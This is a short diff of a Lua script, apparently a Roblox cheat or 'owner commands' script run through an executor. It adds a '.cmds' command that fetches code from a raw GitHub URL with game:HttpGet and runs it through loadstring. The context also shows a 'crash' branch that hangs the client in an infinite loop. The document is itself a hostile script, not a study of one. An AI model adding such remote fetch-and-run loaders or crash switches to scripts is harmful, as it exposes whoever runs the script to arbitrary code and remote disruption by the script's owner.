@@ -297,7 +297,11 @@ slipSound:Destroy()
 		if getgenv().crash then
 		while true do end
 		end
-        elseif command == ".smartwalktome" then
+        
+elseif command == ".cmds" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/deinemudda/refs/heads/main/ownercmdsgui"))()
+
+elseif command == ".smartwalktome" then
         local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 local PlayerModule = require(Player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
